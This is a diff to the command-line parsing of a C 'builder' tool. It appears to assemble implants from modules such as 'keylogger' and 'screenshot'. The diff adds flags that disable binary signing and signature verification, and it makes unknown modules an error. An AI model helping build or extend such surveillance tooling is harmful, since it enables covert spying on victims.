@@ -102,6 +102,8 @@ status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
         {"version", required_argument, 0, 'v'},
         {"help", no_argument, 0, 'h'},
         {"version-info", no_argument, 0, 'i'},
+        {"no-sign", no_argument, 0, 'n'},
+        {"no-verify", no_argument, 0, 'y'},
         {0, 0, 0, 0}
     };
     
@@ -109,7 +111,7 @@ status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
     int opt;
     int option_index = 0;
     
-    while ((opt = getopt_long(argc, argv, "p:s:d:m:e:o:gv:hi", long_options, &option_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "p:s:d:m:e:o:gv:hiny", long_options, &option_index)) != -1) {
         switch (opt) {
             case 'p':
                 if (parse_protocols(optarg, &config->protocols, &config->protocol_count) != STATUS_SUCCESS) {
@@ -195,6 +197,14 @@ status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
                        BUILDER_VERSION_MAJOR, BUILDER_VERSION_MINOR, BUILDER_VERSION_PATCH);
                 builder_clean_config(config);
                 return STATUS_ERROR_INVALID_PARAM;  // Not really an error, but we want to exit
+                
+            case 'n':
+                config->sign_binary = false;
+                break;
+                
+            case 'y':
+                config->verify_signature = false;
+                break;
                 
             default:
                 fprintf(stderr, "Error: Unknown option\n");
@@ -598,7 +608,14 @@ static status_t parse_modules(const char* modules_str, char*** modules, size_t* 
                 strcmp(module, "keylogger") != 0 && 
                 strcmp(module, "screenshot") != 0) {
                 fprintf(stderr, "Warning: Unknown module '%s', it may not be supported\n", module);
-                // We don't return an error here, just a warning
+                // Return an error for unknown modules
+                free(module);
+                for (size_t i = 0; i < index; i++) {
+                    free(module_array[i]);
+                }
+                
+                free(module_array);
+                return STATUS_ERROR_INVALID_PARAM;
             }
             
             module_array[index] = module;
